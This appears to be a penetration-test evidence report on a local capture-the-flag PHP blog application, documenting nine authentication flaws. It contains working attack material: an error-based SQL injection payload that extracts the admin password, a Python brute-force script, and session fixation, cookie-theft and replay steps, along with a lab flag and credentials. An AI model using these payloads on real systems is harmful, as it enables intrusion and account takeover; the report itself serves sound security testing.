# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-07: Default Credential Authentication

**Summary:**
- **Vulnerable location:** POST http://localhost:51233/admin.php (authentication endpoint)
- **Overview:** Hardcoded default credentials (`admin:ONEverySecurePassword_!`) committed to version control in `db_init.sql` line 58, allowing immediate authentication without any exploitation
- **Impact:** Complete authentication bypass - attacker gains immediate admin access and retrieves FLAG
- **Severity:** CRITICAL

**Prerequisites:**
None - credentials are publicly accessible in the Git repository

**Exploitation Steps:**

1. Submit authentication request with default credentials:
```bash
curl -X POST http://localhost:51233/admin.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=ONEverySecurePassword_!" \
  -c /tmp/auth_cookies.txt
```

2. Server responds with authenticated session and FLAG:
```
FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}
Set-Cookie: PHPSESSID=6002fba4f58d2db4aaced68c1a8e5987; path=/
```

3. Verify authenticated access with session cookie:
```bash
curl http://localhost:51233/admin.php \
  -b "PHPSESSID=6002fba4f58d2db4aaced68c1a8e5987"
```

**Proof of Impact:**
Successfully retrieved FLAG: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Default credentials are hardcoded in `/app/db_init.sql` line 58: `INSERT INTO admins (username, password) VALUES ('admin', 'ONEverySecurePassword_!');`

---

### AUTH-VULN-06: Plaintext Credential Extraction via SQL Injection

**Summary:**
- **Vulnerable location:** GET http://localhost:51233/index.php?category=[INJECTION] (line 41 in index.php)
- **Overview:** SQL injection vulnerability in category parameter allows extraction of plaintext admin password from database using error-based injection
- **Impact:** Credential extraction leading to authentication bypass and FLAG capture
- **Severity:** CRITICAL

**Prerequisites:**
None - SQL injection endpoint is publicly accessible

**Exploitation Steps:**

1. Exploit error-based SQL injection to extract admin password:
```bash
curl "http://localhost:51233/index.php" \
  --get \
  --data-urlencode "category=' AND extractvalue(1,concat(0x7e,(SELECT password FROM admins LIMIT 1)))-- -"
```

2. Server returns error message containing plaintext password:
```
Error in query: XPATH syntax error: '~ONEverySecurePassword_!'
```

3. Extract password from error message: `ONEverySecurePassword_!`

4. Authenticate with extracted credentials:
```bash
curl -X POST http://localhost:51233/admin.php \
  -d "username=admin&password=ONEverySecurePassword_!"
```

5. Server grants authenticated session and returns FLAG

**Proof of Impact:**
- Extracted password: `ONEverySecurePassword_!`
- Successfully authenticated and retrieved FLAG: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Vulnerability exists at `/app/html/index.php` line 41 where `$unescaped_category` is used directly in SQL query before sanitization occurs at line 52. Password is stored in plaintext in `admins` table.

---

### AUTH-VULN-03: Session Hijacking via Non-HttpOnly Cookie

**Summary:**
- **Vulnerable location:** All authenticated requests using PHPSESSID cookie
- **Overview:** Session cookie lacks HttpOnly flag, allowing JavaScript access via `document.cookie`, enabling XSS-based session theft
- **Impact:** Account takeover through session hijacking - attacker can steal admin session and access protected resources
- **Severity:** HIGH

**Prerequisites:**
- Attacker must execute JavaScript in victim's browser context (e.g., via XSS vulnerability)
- Or attacker intercepts HTTP traffic to capture cookie

**Exploitation Steps:**

1. Victim authenticates to admin panel:
```bash
curl -X POST http://localhost:51233/admin.php \
  -d "username=admin&password=ONEverySecurePassword_!" \
  -c /tmp/victim_session.txt
```

2. Attacker executes JavaScript in victim's browser to steal cookie:
```javascript
document.cookie
// Returns: "PHPSESSID=6fad664d8d92511ac157b4f393f699b6"
```

3. Attacker uses stolen session cookie to hijack authenticated session:
```bash
curl http://localhost:51233/admin.php \
  -H "Cookie: PHPSESSID=6fad664d8d92511ac157b4f393f699b6"
```

**Proof of Impact:**
- JavaScript successfully accessed session cookie: `PHPSESSID=6fad664d8d92511ac157b4f393f699b6`
- Stolen cookie granted full admin access and FLAG retrieval: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Session cookie is created at `/app/html/admin.php` line 2 with `session_start()` but no `session_set_cookie_params()` configuration exists to set HttpOnly flag. This vulnerability can be chained with stored XSS vulnerabilities in the blog application.

---

### AUTH-VULN-04: Session Fixation Attack

**Summary:**
- **Vulnerable location:** POST http://localhost:51233/admin.php (authentication handler)
- **Overview:** Session ID is not regenerated after successful authentication, allowing attacker to pre-set victim's session ID and hijack it after victim authenticates
- **Impact:** Account takeover through session fixation - attacker gains admin access without knowing credentials
- **Severity:** HIGH

**Prerequisites:**
- Attacker must convince victim to authenticate using a pre-set session ID (via social engineering, cookie injection, or malicious link)

**Exploitation Steps:**

1. Attacker creates a known session ID by visiting admin page:
```bash
curl http://localhost:51233/admin.php -c /tmp/attacker_session.txt
```

Session created: `PHPSESSID=3e92798f295ee15f7f656c8a6c34b147`

2. Attacker fixes victim's session to this ID (via social engineering, injected cookie, etc.)

3. Victim authenticates using the fixed session ID:
```bash
curl -X POST http://localhost:51233/admin.php \
  -b "PHPSESSID=3e92798f295ee15f7f656c8a6c34b147" \
  -d "username=admin&password=ONEverySecurePassword_!"
```

Response: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

4. Attacker uses the same session ID to hijack authenticated session:
```bash
curl http://localhost:51233/admin.php \
  -b "PHPSESSID=3e92798f295ee15f7f656c8a6c34b147"
```

**Proof of Impact:**
- Session ID `3e92798f295ee15f7f656c8a6c34b147` remained unchanged after authentication
- Attacker successfully accessed admin panel using pre-set session ID
- Retrieved FLAG: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Code at `/app/html/admin.php` lines 23-26 sets `$_SESSION['admin_logged_in'] = true` without calling `session_regenerate_id(true)`. No session ID rotation occurs during authentication.

---

### AUTH-VULN-08: Brute Force Attack without Rate Limiting

**Summary:**
- **Vulnerable location:** POST http://localhost:51233/admin.php (authentication endpoint)
- **Overview:** No rate limiting, CAPTCHA, or account lockout on authentication endpoint, allowing unlimited password guessing attempts at full network speed
- **Impact:** Successful brute force attack - discovered valid password after 6 rapid attempts with no throttling
- **Severity:** HIGH

**Prerequisites:**
None - authentication endpoint is publicly accessible with no rate limiting

**Exploitation Steps:**

1. Execute automated brute force attack with common password list:
```python
import requests
import time

target = "http://localhost:51233/admin.php"
username = "admin"
passwords = ['admin', 'password', '123456', 'admin123', 'password123', 'ONEverySecurePassword_!']

for i, pwd in enumerate(passwords, 1):
    start = time.time()
    response = requests.post(target, data={'username': username, 'password': pwd})
    elapsed = time.time() - start
    
    success = "FLAG" in response.text
    print(f"Attempt #{i} - Password: {pwd} - {'SUCCESS' if success else 'FAILED'} ({elapsed:.3f}s)")
    
    if success:
        print(f"Valid password found: {pwd}")
        break
```

2. Brute force attack results:
```
Attempt #1 - Password: admin - FAILED (0.012s)
Attempt #2 - Password: password - FAILED (0.010s)
Attempt #3 - Password: 123456 - FAILED (0.018s)
Attempt #4 - Password: admin123 - FAILED (0.012s)
Attempt #5 - Password: password123 - FAILED (0.010s)
Attempt #6 - Password: ONEverySecurePassword_! - SUCCESS (0.008s)
Valid password found: ONEverySecurePassword_!
```

**Proof of Impact:**
- Successfully performed 6 authentication attempts in 0.693 seconds (average 0.012s per attempt)
- No rate limiting detected - all attempts processed without delays or blocking
- Discovered valid password and retrieved FLAG: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Authentication handler at `/app/html/admin.php` lines 11-29 has no attempt tracking, throttling, CAPTCHA, or account lockout mechanisms. No rate limiting at Apache or infrastructure level.

---

### AUTH-VULN-05: Missing Logout Functionality for Session Persistence

**Summary:**
- **Vulnerable location:** Application-wide (no logout endpoint exists)
- **Overview:** No logout functionality exists in the application - users cannot terminate their authenticated sessions, making hijacked sessions persist indefinitely
- **Impact:** Extends window for session hijacking attacks - compromised sessions cannot be invalidated by legitimate users
- **Severity:** MEDIUM

**Prerequisites:**
- Attacker must first compromise a session (via AUTH-VULN-03, AUTH-VULN-04, or AUTH-VULN-10)

**Exploitation Steps:**

1. Admin authenticates and establishes session:
```bash
curl -X POST http://localhost:51233/admin.php \
  -c /tmp/admin_session.txt \
  -d "username=admin&password=ONEverySecurePassword_!"
```

Session created: `PHPSESSID=7d4bc9a36bfaea17febf2557a8355e20`

2. Session is compromised (via XSS, network interception, etc.)

3. Admin attempts to logout but no endpoint exists:
```bash
curl http://localhost:51233/logout.php
```

Response: `404 Not Found - The requested URL was not found on this server`

4. Attacker continues accessing admin panel with compromised session:
```bash
curl http://localhost:51233/admin.php \
  -b "PHPSESSID=7d4bc9a36bfaea17febf2557a8355e20"
```

**Proof of Impact:**
- No logout endpoint exists (confirmed via 404 error on /logout.php)
- No `session_destroy()` or `session_unset()` calls found in codebase
- Compromised session successfully accessed FLAG after attempted logout: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Searched entire codebase for logout functionality - zero matches found for `session_destroy()`, `session_unset()`, or logout-related files. Sessions persist until PHP garbage collection (probabilistic, ~24 minutes) or browser closure.

---

### AUTH-VULN-10: Session Replay from Different IP/Browser

**Summary:**
- **Vulnerable location:** GET http://localhost:51233/admin.php (session validation logic)
- **Overview:** Session validation only checks boolean flag existence with no binding to IP address, user agent, or client fingerprint
- **Impact:** Stolen session cookies can be replayed from any location/browser - enables account takeover from attacker's device
- **Severity:** HIGH

**Prerequisites:**
- Attacker must obtain valid session cookie (via AUTH-VULN-03, network interception, or other session theft)

**Exploitation Steps:**

1. Victim authenticates from Windows Chrome browser:
```bash
curl -X POST http://localhost:51233/admin.php \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/100" \
  -c /tmp/windows_session.txt \
  -d "username=admin&password=ONEverySecurePassword_!"
```

Session created: `PHPSESSID=22c25f25d74cc2a3963f9430d815be1e`

2. Attacker steals session cookie and replays from iPhone Safari:
```bash
curl http://localhost:51233/admin.php \
  -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0) Safari/14" \
  -b "PHPSESSID=22c25f25d74cc2a3963f9430d815be1e"
```

Response: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

3. Attacker replays again from Android Firefox:
```bash
curl http://localhost:51233/admin.php \
  -H "User-Agent: Mozilla/5.0 (Linux; Android 11) Firefox/90" \
  -b "PHPSESSID=22c25f25d74cc2a3963f9430d815be1e"
```

Response: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Proof of Impact:**
- Session created from Windows Chrome successfully replayed from iPhone Safari and Android Firefox
- No validation of user agent, IP address, or client properties
- Attacker successfully accessed FLAG from completely different device/browser contexts: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Session validation at `/app/html/admin.php` lines 5-8 only checks `isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true` with no additional session binding or integrity checks.

---

### AUTH-VULN-01: Credential Interception over HTTP (Network Attack)

**Summary:**
- **Vulnerable location:** POST http://localhost:51233/admin.php (all authentication traffic)
- **Overview:** Application serves all content over unencrypted HTTP with no HTTPS/TLS configuration, transmitting credentials in plaintext POST bodies
- **Impact:** Credentials and session cookies exposed to network interception via packet sniffing or man-in-the-middle attacks
- **Severity:** CRITICAL

**Prerequisites:**
- Attacker must be positioned on the same network as victim (same WiFi, LAN, or ISP-level access)
- Requires network packet capture tools (tcpdump, Wireshark, etc.)

**Exploitation Steps:**

1. Verify application uses HTTP (not HTTPS):
```bash
curl -v -X POST http://localhost:51233/admin.php \
  -d "username=admin&password=ONEverySecurePassword_!"
```

Headers show:
```
> POST /admin.php HTTP/1.1
> Host: localhost:51233
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 48
```

2. POST body transmitted in plaintext:
```
username=admin&password=ONEverySecurePassword_!
```

3. Attacker on same network performs packet sniffing to capture:
   - Plaintext credentials from POST body
   - Session cookies from response headers

4. Attacker authenticates with captured credentials:
```bash
curl -X POST http://localhost:51233/admin.php \
  -d "username=admin&password=ONEverySecurePassword_!"
```

**Proof of Impact:**
- Confirmed HTTP-only transmission (no HTTPS/TLS)
- Credentials transmitted in plaintext POST body
- Apache configuration shows `<VirtualHost *:80>` with no SSL directives
- Successful authentication with interceptable credentials retrieves FLAG: `FLAG{bf637e1a20d2f793ce59e38029da94c08a83528042ecf70a29cf230fb5413178}`

**Notes:**
Apache configuration at `/app/000-default.conf` line 1 shows HTTP-only VirtualHost with no SSL certificates or HTTPS redirect. Docker compose maps port 51233:80. This vulnerability requires network positioning but is externally exploitable from same network segment.

---

## Confirmed Vulnerabilities (Unable to Fully Demonstrate)

### AUTH-VULN-09: Session Timeout Extension via Garbage Collection

**Summary:**
- **Vulnerable location:** Session lifecycle management (no timeout configuration)
- **Current Blocker:** Cannot demonstrate in real-time (requires waiting 24+ minutes to observe timeout behavior)
- **Potential Impact:** Hijacked sessions persist beyond expected 24-minute timeout due to probabilistic garbage collection
- **Confidence:** HIGH

**Evidence of Vulnerability:**

Configuration analysis shows:
- No `session.gc_maxlifetime` configuration in Dockerfile
- No application-level timeout checking in admin.php
- PHP using default garbage collection settings (1440 seconds / 24 minutes)
- Garbage collection is probabilistic, not guaranteed

**How This Would Be Exploited:**

If real-time testing were possible:

1. Create authenticated session at time T=0
2. Wait 24 minutes (expected timeout)
3. Verify session still valid due to garbage collection not running
4. Continue accessing admin panel beyond expected timeout window

Expected result: Session persists beyond 24 minutes, potentially indefinitely until garbage collection probabilistically triggers.

**Expected Impact:**
- Extends window for session hijacking attacks
- Compromised sessions remain valid longer than expected
- Amplifies impact of AUTH-VULN-03, AUTH-VULN-04, and AUTH-VULN-10

**Notes:**
This vulnerability is real but time-dependent. The `/app/Dockerfile` contains no session timeout configuration (lines 9-13 only configure error logging). The absence of explicit timeout configuration means sessions rely entirely on PHP's default probabilistic garbage collection mechanism.
